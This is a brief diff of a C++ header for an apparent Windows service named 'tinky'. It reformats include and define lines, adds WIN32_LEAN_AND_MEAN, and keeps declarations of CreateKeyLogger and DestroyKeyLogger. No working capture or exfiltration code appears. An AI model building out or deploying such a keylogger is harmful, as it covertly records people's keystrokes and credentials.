@@ -13,18 +13,17 @@
 #ifndef TINKY_HPP
 #define TINKY_HPP
 
-#pragma warning(disable: 5039)
-#pragma warning(disable: 4668)
+# define WIN32_LEAN_AND_MEAN
 
-#include <Windows.h>
-#include <signal.h>
-#include <ctype.h>
-#include <string.h>
+# include <Windows.h>
+# include <signal.h>
+# include <ctype.h>
+# include <string.h>
 
-#include <iostream>
-#include <fstream>
+# include <iostream>
+# include <fstream>
 
-#define SERVICE_NAME "tinky"
+# define SERVICE_NAME "tinky"
 
 INT CreateKeyLogger();
 VOID DestroyKeyLogger();
